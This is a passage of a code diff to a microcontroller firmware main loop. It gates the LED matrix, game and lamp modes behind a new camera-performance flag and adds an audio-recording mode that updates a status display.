-  } else if (appMode == APP_MATRIX_TEXT) {
-    matrixTextLoop();
-  } else if (waterMode) {
-    if (!imuOn) QMI8658_SetEnabled(true);
-    applyBrightnessIfDirty();
-    waterStep();
-  } else if (lampOn) {
-    if (matrixDirty || brightnessDirty) {
-      matrixCommitToPixels();
-      matrixDirty = false;
+  if (!cameraPerfMode) {
+    if (appMode == APP_GAME) {
+      gameLoop();
+    } else if (appMode == APP_MATRIX_TEXT) {
+      matrixTextLoop();
+    } else if (waterMode) {
+      if (!imuOn) QMI8658_SetEnabled(true);
+      applyBrightnessIfDirty();
+      waterStep();
+    } else if (lampOn) {
+      if (matrixDirty || brightnessDirty) {
+        matrixCommitToPixels();
+        matrixDirty = false;
+      }
+    } else {
+      if (matrixDirty || brightnessDirty) {
+        matrixCommitToPixels();
+        matrixDirty = false;
+      }
+      if (matrixIdleDirty && appMode == APP_UI && !LittleFS.exists(MATRIX_PATH)) matrixShowIdleFace();
     }
-  } else {
-    if (matrixDirty || brightnessDirty) {
-      matrixCommitToPixels();
-      matrixDirty = false;
-    }
-    if (matrixIdleDirty && appMode == APP_UI && !LittleFS.exists(MATRIX_PATH)) matrixShowIdleFace();
   }
-  if (appMode == APP_UI && !tftSleeping) {
+  if (!cameraPerfMode && appMode == APP_UI && !tftSleeping) {
     struct tm tmNow;
     if (getLocalTime(&tmNow, 0)) {
       if (tmNow.tm_min != lastUiMinute) {
@@ -7478,6 +10387,12 @@ void loop() {
       }
       gifLoopStep();
       cameraStop();
+    } else if (appMode == APP_AUDIO_RECORD) {
+      if (tftDirty) {
+        tftDirty = false;
+        tftDrawAudioRecordStatus();
+      }
+      gifStop();
     } else if (appMode == APP_CAMERA) {
       cameraLoop();
     } else if (appMode == APP_UI && tftDirty) {
@@ -7490,3 +10405,4 @@ void loop() {
   }
   delay(1);
 }
+
